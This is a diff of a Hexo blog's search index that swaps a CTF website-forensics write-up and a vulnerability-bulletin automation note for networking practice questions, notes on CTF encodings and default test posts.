-]]></content>
-  </entry>
-  <entry>
-    <title>[蓝帽杯 2022 初赛]网站取证_2</title>
-    <url>/2025/02/14/%E8%93%9D%E5%B8%BD%E6%9D%AF-2022-%E5%88%9D%E8%B5%9B-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81-2/</url>
-    <content><![CDATA[<h1 id="省流版"><a href="#省流版" class="headerlink" title="省流版"></a>省流版</h1><p>打开”…....\网站取证\WWW\application\database.php”，把PHP版本调成7.2以下，在最后添上</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">my_encrypt</span>();</span><br></pre></td></tr></table></figure>
-
-<p>运行，结束</p>
-<h1 id="为什么可以这样做？"><a href="#为什么可以这样做？" class="headerlink" title="为什么可以这样做？"></a>为什么可以这样做？</h1><p>点击license.txt文件，发现是thinkphp框架</p>
-<p>数据库文件是application&#x2F;database.php,跳转到数据库文件，发现该文件是加密的</p>
-<p>利用代码追踪功能，追踪加密函数</p>
-<img src="/2025/02/14/%E8%93%9D%E5%B8%BD%E6%9D%AF-2022-%E5%88%9D%E8%B5%9B-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81-2/QQ20250214-122319.png" class="" title="QQ20250214-122319">
-]]></content>
+    <title>汉堡师傅计网方面灵魂拷问</title>
+    <url>/2025/02/11/%E6%B1%89%E5%A0%A1%E5%B8%88%E5%82%85%E8%AE%A1%E7%BD%91%E6%96%B9%E9%9D%A2%E7%81%B5%E9%AD%82%E6%8B%B7%E9%97%AE/</url>
+    <content><![CDATA[<p>现在你有以下需求：<br>1、假设你有多个需要上网的设备，同时你需要所有属于你的设备使用代理访问外网。有些设备不方便单独配置代理vpn，只能进行一些简单配置，如ip、网关<br>2、一般来说，一些路由器支持在路由器端直接配置代理，所有通过该路由器进行转发的包都会经过该代理<br>3、家里其他人需要上网，同时他们使用的网络服务都在国内不需要代理甚至不能配置代理</p>
+<p>你现在有两台路由器，你可以怎么进行配置进而满足你的需求呢？</p>
+<p>题目2：<br>1、有两个网络环境，一个是能访问互联网的路由器A，一个是全本地的局域网路由器B，你在局域网下部署有服务需要访问。<br>2、你只有一台电脑，你需要同时访问这两个网络环境，请问你应该如何配置？<br>附加：<br>如果路由器A和B的网段重合，你应该如何配置本机？</p>
+<p>题目3：有一台神秘设备连接在局域网内，你不能访问路由器后台，你应该如何获取该设备ip？ </p>
+<p>nmap用什么指令？指令是什么原理？</p>
+<h1 id="师傅还推荐用wireshark啊可惜你现在还是不太会用"><a href="#师傅还推荐用wireshark啊可惜你现在还是不太会用" class="headerlink" title="师傅还推荐用wireshark啊可惜你现在还是不太会用"></a>师傅还推荐用wireshark啊可惜你现在还是不太会用</h1>]]></content>
       <categories>
-        <category>取证</category>
+        <category>计网</category>
       </categories>
       <tags>
-        <tag>电子取证</tag>
-        <tag>网站取证</tag>
+        <tag>笔记</tag>
       </tags>
   </entry>
   <entry>
-    <title>自动化漏洞通报</title>
-    <url>/2025/02/26/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%8A%A5/</url>
-    <content><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>漏洞通告</p>
-<p>自动化吧，建议ai+爬虫自动生产就行</p>
-<p>监控下公众号或者威胁情况官网的更新，然后自动调大模型生产就行了</p>
-<p><a href="https://avd.aliyun.com/high-risk/list">https://avd.aliyun.com/high-risk/list</a> 数据源可以用这个，大模型自己选吧，无所谓，用免费的就行</p>
-<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>表格</p>
-<p>时间戳</p>
-<p>滑块验证</p>
+    <title>misc的各种编码</title>
+    <url>/2025/02/11/misc%E7%9A%84%E5%90%84%E7%A7%8D%E7%BC%96%E7%A0%81/</url>
+    <content><![CDATA[<h2 id="emoji编码"><a href="#emoji编码" class="headerlink" title="emoji编码"></a>emoji编码</h2><p>在线网站解密<a href="https://aghorler.github.io/emoji-aes/">https://aghorler.github.io/emoji-aes/</a></p>
+<p>key一般在文件名中或其他地方</p>
+<p>e.g.[SWPUCTF 2023 秋季新生赛]谁发的图片打不开啊</p>
+<h1 id="佛"><a href="#佛" class="headerlink" title="佛"></a>佛</h1><h1 id="BK编码"><a href="#BK编码" class="headerlink" title="BK编码"></a>BK编码</h1><h1 id="JSFuck编码"><a href="#JSFuck编码" class="headerlink" title="JSFuck编码"></a>JSFuck编码</h1><p>&#x2F;&#x2F;特征：与jother很像，只是少了{ }</p>
+<p>特征：[] + ! ()</p>
 ]]></content>
+      <categories>
+        <category>Misc</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>my first blog</title>
+    <url>/2025/02/11/my-first-blog/</url>
+    <content><![CDATA[<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><p>代码测试： </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>图片测试： </p>
+<img src="/2025/02/11/my-first-blog/%E5%A4%B4%E5%83%8F.jpg" class="" title="头像">
+
+<p>引用测试：</p>
+<blockquote>
+<p>这是一条引用 </p>
+</blockquote>
+<h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><p>无序列表测试：</p>
+<ul>
+<li>哈哈 </li>
+<li><ul>
+<li>嘿嘿 </li>
+<li>吼吼</li>
+</ul>
+</li>
+</ul>
+<h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><p>home_cover:![头像](my-first-blog&#x2F;头像.jpg</p>
+<p>categories:”index”</p>
+<p>tags:test<br>sticky:2</p>
+]]></content>
+      <categories>
+        <category>Index</category>
+      </categories>
+      <tags>
+        <tag>First</tag>
+        <tag>Test</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2025/02/11/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p><img src="C:\Users\111\Desktop\myBlog\source_posts\my-first-blog\头像.jpg" alt="头像"></p>
+]]></content>
+      <categories>
+        <category>Index</category>
+      </categories>
+      <tags>
+        <tag>First</tag>
+      </tags>
   </entry>
 </search>
